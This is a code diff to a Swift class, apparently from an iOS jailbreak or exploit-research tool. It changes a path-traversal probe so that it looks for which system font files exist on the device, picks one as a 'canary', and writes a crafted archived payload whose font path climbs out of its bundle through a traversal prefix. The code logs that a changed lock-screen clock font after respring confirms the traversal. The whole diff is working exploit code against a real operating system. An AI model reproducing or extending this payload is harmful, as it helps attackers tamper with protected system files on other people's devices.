@@ -3819,14 +3819,41 @@ class SymHandler {
         diag.append("  fontPostScriptName: pp-probe-13")
         diag.append("  extensionBundleRelativeFilePath: \(pbFontPath.prefix(120))...")
 
-        // Secondary payload: traverse to system font CourierNew.ttf.
-        // Courier New digits are monospaced/typewriter — unmistakably different from SF Pro.
-        // If clock shows serif monospaced numerals after respring → PATH TRAVERSAL CONFIRMED.
-        _PP13CustomFontConfigProxy.fontPostScriptName = "CourierNewPSMT"
-        _PP13CustomFontConfigProxy.extensionBundleRelativeFilePath =
-            traversalPrefix + "System/Library/Fonts/CourierNew.ttf"
+        // Probe which distinctive system font files actually exist on this device.
+        // Auto-pick the first one found; fall back to HelveticaNeue (confirmed path).
+        let candidateFonts: [(ps: String, path: String, label: String)] = [
+            ("Zapfino",            "/System/Library/Fonts/Zapfino.ttf",           "calligraphic"),
+            ("CourierNewPSMT",     "/System/Library/Fonts/CourierNew.ttf",         "typewriter"),
+            ("Georgia",            "/System/Library/Fonts/Georgia.ttf",            "serif"),
+            ("TimesNewRomanPSMT",  "/System/Library/Fonts/TimesNewRoman.ttf",      "times"),
+            ("AmericanTypewriter", "/System/Library/Fonts/AmericanTypewriter.ttc", "typewriter2"),
+            ("HelveticaNeue",      "/System/Library/Fonts/HelveticaNeue.ttc",      "helvetica"),
+        ]
+        diag.append("canary font file check:")
+        var chosenPS    = "HelveticaNeue"
+        var chosenRel   = "System/Library/Fonts/HelveticaNeue.ttc"
+        var chosenLabel = "helvetica-fallback"
+        for c in candidateFonts {
+            let exists = fm.fileExists(atPath: c.path)
+            diag.append("  \(exists ? "YES" : " no") \(c.ps)")
+            if exists && chosenLabel == "helvetica-fallback" && c.ps != "HelveticaNeue" {
+                chosenPS    = c.ps
+                chosenRel   = String(c.path.dropFirst())   // strip leading /
+                chosenLabel = c.label
+            }
+        }
+        diag.append("chosen canary: \(chosenPS) [\(chosenLabel)]")
+        let notable = UIFont.familyNames.sorted().filter {
+            let l = $0.lowercased()
+            return l.contains("courier") || l.contains("georgia") || l.contains("zapfino")
+                || l.contains("typewriter") || l.contains("times") || l.contains("baskerville")
+        }
+        if !notable.isEmpty { diag.append("UIFont notable: \(notable.joined(separator: ", "))") }
+
+        _PP13CustomFontConfigProxy.fontPostScriptName = chosenPS
+        _PP13CustomFontConfigProxy.extensionBundleRelativeFilePath = traversalPrefix + chosenRel
         let payload13sys = payloadTitleStyleCustomFont13
-        diag.append("payload13sys (CourierNew system font): \(payload13sys.count)b")
+        diag.append("payload13sys (\(chosenLabel) \(chosenPS)): \(payload13sys.count)b")
         // Verify class names are correct in the archive
         p7DumpNSKAKeys(data: payload13sys, indent: "  arc: ", diag: &diag)
 
@@ -3884,8 +3911,8 @@ class SymHandler {
         }
 
         diag.append("\ntotal written: \(totalWritten)")
-        diag.append("payload13sys path: \(traversalPrefix + "System/Library/Fonts/CourierNew.ttf")")
-        diag.append("After respring: lock screen clock in TYPEWRITER/MONOSPACED digits = PATH TRAVERSAL CONFIRMED")
+        diag.append("payload13sys path: \(traversalPrefix + chosenRel)")
+        diag.append("After respring: clock in \(chosenLabel.uppercased()) digits = PATH TRAVERSAL CONFIRMED")
         return pbSave(diag)
     }
 }
